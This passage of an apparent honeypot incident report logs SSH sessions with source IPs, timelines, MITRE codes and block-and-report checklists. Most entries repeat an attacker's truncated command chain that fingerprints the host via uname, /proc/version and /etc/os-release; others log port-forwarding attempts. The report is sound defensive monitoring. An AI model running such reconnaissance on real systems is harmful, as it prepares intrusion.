| `2026-08-22 15:51:08` | `cowrie.command.success` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.command.input` |
| `2026-08-22 15:51:08` | `cowrie.log.closed` |
| `2026-08-22 15:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ce058a0639

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:52 |
| **Last Seen** | 2026-08-22 15:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:52:17` | `cowrie.session.connect` |
| `2026-08-22 15:52:18` | `cowrie.client.version` |
| `2026-08-22 15:52:18` | `cowrie.client.kex` |
| `2026-08-22 15:52:19` | `cowrie.login.success` |
| `2026-08-22 15:52:21` | `cowrie.session.params` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.success` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.command.input` |
| `2026-08-22 15:52:21` | `cowrie.log.closed` |
| `2026-08-22 15:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f73769e2ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:53 |
| **Last Seen** | 2026-08-22 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:53:40` | `cowrie.session.connect` |
| `2026-08-22 15:53:41` | `cowrie.client.version` |
| `2026-08-22 15:53:41` | `cowrie.client.kex` |
| `2026-08-22 15:53:42` | `cowrie.login.success` |
| `2026-08-22 15:53:43` | `cowrie.session.params` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.success` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:43` | `cowrie.command.input` |
| `2026-08-22 15:53:44` | `cowrie.log.closed` |
| `2026-08-22 15:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d803646609

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:55 |
| **Last Seen** | 2026-08-22 15:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:55:04` | `cowrie.session.connect` |
| `2026-08-22 15:55:04` | `cowrie.client.version` |
| `2026-08-22 15:55:04` | `cowrie.client.kex` |
| `2026-08-22 15:55:05` | `cowrie.login.success` |
| `2026-08-22 15:55:07` | `cowrie.session.params` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.success` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.command.input` |
| `2026-08-22 15:55:07` | `cowrie.log.closed` |
| `2026-08-22 15:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d12bb4ec6e6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:56 |
| **Last Seen** | 2026-08-22 15:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:56:26` | `cowrie.session.connect` |
| `2026-08-22 15:56:26` | `cowrie.client.version` |
| `2026-08-22 15:56:26` | `cowrie.client.kex` |
| `2026-08-22 15:56:27` | `cowrie.login.success` |
| `2026-08-22 15:56:28` | `cowrie.session.params` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.success` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.command.input` |
| `2026-08-22 15:56:28` | `cowrie.log.closed` |
| `2026-08-22 15:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4630b0e952bd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:57 |
| **Last Seen** | 2026-08-22 15:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:57:47` | `cowrie.session.connect` |
| `2026-08-22 15:57:48` | `cowrie.client.version` |
| `2026-08-22 15:57:48` | `cowrie.client.kex` |
| `2026-08-22 15:57:48` | `cowrie.login.success` |
| `2026-08-22 15:57:49` | `cowrie.session.params` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.success` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:49` | `cowrie.command.input` |
| `2026-08-22 15:57:50` | `cowrie.log.closed` |
| `2026-08-22 15:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ff7d6ab47d

| Field | Detail |
|---|---|
| **Source IP** | `46.4.112[.]25` |
| **First Seen** | 2026-08-22 15:58 |
| **Last Seen** | 2026-08-22 15:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:58:26` | `cowrie.session.connect` |
| `2026-08-22 15:58:26` | `cowrie.client.version` |
| `2026-08-22 15:58:26` | `cowrie.client.kex` |
| `2026-08-22 15:58:27` | `cowrie.login.success` |
| `2026-08-22 15:58:27` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.4.112[.]25` to AbuseIPDB if not already reported
- [ ] Block `46.4.112[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c93f4aa293d

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-22 15:58 |
| **Last Seen** | 2026-08-22 15:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:58:32` | `cowrie.session.connect` |
| `2026-08-22 15:58:33` | `cowrie.client.version` |
| `2026-08-22 15:58:33` | `cowrie.client.kex` |
| `2026-08-22 15:58:34` | `cowrie.login.success` |
| `2026-08-22 15:58:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbf0efd43b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:59 |
| **Last Seen** | 2026-08-22 15:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:59:15` | `cowrie.session.connect` |
| `2026-08-22 15:59:16` | `cowrie.client.version` |
| `2026-08-22 15:59:16` | `cowrie.client.kex` |
| `2026-08-22 15:59:16` | `cowrie.login.success` |
| `2026-08-22 15:59:17` | `cowrie.session.params` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.success` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:17` | `cowrie.command.input` |
| `2026-08-22 15:59:18` | `cowrie.log.closed` |
| `2026-08-22 15:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0829836e1b32

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:59 |
| **Last Seen** | 2026-08-22 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:59:41` | `cowrie.session.connect` |
| `2026-08-22 15:59:41` | `cowrie.client.version` |
| `2026-08-22 15:59:41` | `cowrie.client.kex` |
| `2026-08-22 15:59:42` | `cowrie.login.success` |
| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2072bd5d4431

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:59 |
| **Last Seen** | 2026-08-22 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:59:46` | `cowrie.session.connect` |
| `2026-08-22 15:59:46` | `cowrie.client.version` |
| `2026-08-22 15:59:46` | `cowrie.client.kex` |
| `2026-08-22 15:59:47` | `cowrie.login.success` |
| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798195bf532f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:00 |
| **Last Seen** | 2026-08-22 16:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:00:52` | `cowrie.session.connect` |
| `2026-08-22 16:00:52` | `cowrie.client.version` |
| `2026-08-22 16:00:52` | `cowrie.client.kex` |
| `2026-08-22 16:00:53` | `cowrie.login.success` |
| `2026-08-22 16:00:54` | `cowrie.session.params` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.success` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.command.input` |
| `2026-08-22 16:00:54` | `cowrie.log.closed` |
| `2026-08-22 16:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e81f2574826e

| Field | Detail |
|---|---|
| **Source IP** | `72.24.210[.]58` |
| **First Seen** | 2026-08-22 16:02 |
| **Last Seen** | 2026-08-22 16:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:02:14` | `cowrie.session.connect` |
| `2026-08-22 16:02:14` | `cowrie.client.version` |
| `2026-08-22 16:02:14` | `cowrie.client.kex` |
| `2026-08-22 16:02:15` | `cowrie.login.success` |
| `2026-08-22 16:02:15` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.24.210[.]58` to AbuseIPDB if not already reported
- [ ] Block `72.24.210[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1383d50c7b2

| Field | Detail |
|---|---|
| **Source IP** | `138.84.59[.]192` |
| **First Seen** | 2026-08-22 16:02 |
| **Last Seen** | 2026-08-22 16:07 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:02:21` | `cowrie.session.connect` |
| `2026-08-22 16:02:22` | `cowrie.client.version` |
| `2026-08-22 16:02:22` | `cowrie.client.kex` |
| `2026-08-22 16:02:24` | `cowrie.login.success` |
| `2026-08-22 16:02:24` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.59[.]192` to AbuseIPDB if not already reported
- [ ] Block `138.84.59[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d480af08816

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:02 |
| **Last Seen** | 2026-08-22 16:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:02:29` | `cowrie.session.connect` |
| `2026-08-22 16:02:29` | `cowrie.client.version` |
| `2026-08-22 16:02:29` | `cowrie.client.kex` |
| `2026-08-22 16:02:30` | `cowrie.login.success` |
| `2026-08-22 16:02:31` | `cowrie.session.params` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.success` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.command.input` |
| `2026-08-22 16:02:31` | `cowrie.log.closed` |
| `2026-08-22 16:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbd2a6adae4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:04 |
| **Last Seen** | 2026-08-22 16:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:04:12` | `cowrie.session.connect` |
| `2026-08-22 16:04:13` | `cowrie.client.version` |
| `2026-08-22 16:04:13` | `cowrie.client.kex` |
| `2026-08-22 16:04:13` | `cowrie.login.success` |
| `2026-08-22 16:04:14` | `cowrie.session.params` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.success` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:14` | `cowrie.command.input` |
| `2026-08-22 16:04:15` | `cowrie.log.closed` |
